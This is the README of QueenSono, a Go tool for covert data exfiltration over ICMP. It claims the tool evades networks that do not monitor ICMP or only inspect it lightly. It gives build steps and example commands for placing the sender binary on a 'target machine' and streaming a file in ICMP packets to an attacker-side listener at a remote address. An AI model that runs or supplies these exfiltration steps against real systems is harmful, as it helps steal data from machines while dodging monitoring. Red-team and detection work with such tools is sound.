
  <h1 align="center">QueenSono <i> ICMP Data Exfiltration </i></h1>
<h4 align="center"> A Golang Package for Data Exfiltration with ICMP protocol. </h4>
  <p align="center">
  QueenSono tool only relies on the fact that ICMP protocol isn't monitored. It is quite common. It could also been used within a system with basic ICMP inspection (ie. frequency and content length watcher). Try to imitate <a href="https://github.com/ytisf/PyExfil">PyExfil</a> (and others) with the idea that the target machine does not necessary have python installed (so provide a binary could be useful)
    <br />
    <strong>
    <a href="https://github.com/othneildrew/Best-README-Template">How to install it</a>
    .
    <a href="https://github.com/othneildrew/Best-README-Template">Use it</a>
    ·
    <a href="https://github.com/othneildrew/Best-README-Template/issues">Notes</a>
    ·
    <a href="https://github.com/ariary/QueenSono/issues">Request Feature</a>
  </strong>
  </p>
</p>

## Install
 *\> Install the binary from source*
Clone the repo and download the dependencies locally:
```    
git clone https://github.com/ariary/QueenSono.git
make before.build
```

 To build the ICMP packet sender `qssender` :

     build.queensono-sender
    

 To build the ICMP packet receiver `qsreceiver` :

     build.queensono-receiver

## Usage

`qssender` is the binary which will send ICMP packet  to the listener , so it is the binary you have to transfer on your target machine. `qsreceiver` is the listener on your local machine (or wherever you can receive icmp packet)

All commands and flags of the binaries could be found using `--help`

### Example 1: Send with "ACK"
*\> In this example we want to send a big file and look after echo reply to ackowledge the reception of the packets (ACK).*

On my local machine:

    $ qsreceiver receive -l 0.0.0.0 -p -f received_bible.txt
 

 - `-l 0.0.0.0` listen on all interfaces for ICMP packet
 - `-f received_bible.txt` save received data in a text
 - `-p` show a progress bar of received data

On target machine:

    $ wget https://raw.githubusercontent.com/mxw/grmr/master/src/finaltests/bible.txt #download a huge file (for the example)
    $ qssender send file -d 2 -l 127.0.0.1 -r 10.0.0.92 -s 50000 bible.txt

<details>
  <summary>Explanation</summary>
  <ol>
    <li>
    <code>send file</code> for sending file (`bible.txt` is the file in question)
    </li>
    <li>
      <code>-d 2</code> send a packet each 2 seconds
    </li>
    <li><code>-l 127.0.0.1</code> the listening address for *echo reply* </li>
    <li><code>-r 10.0.0.92</code>` the address of my remote machine with `qsreceiver` listening</li>
    <li><code>-s 50000</code> the data size I want to send in each packet</li>
  </ol>
</details>



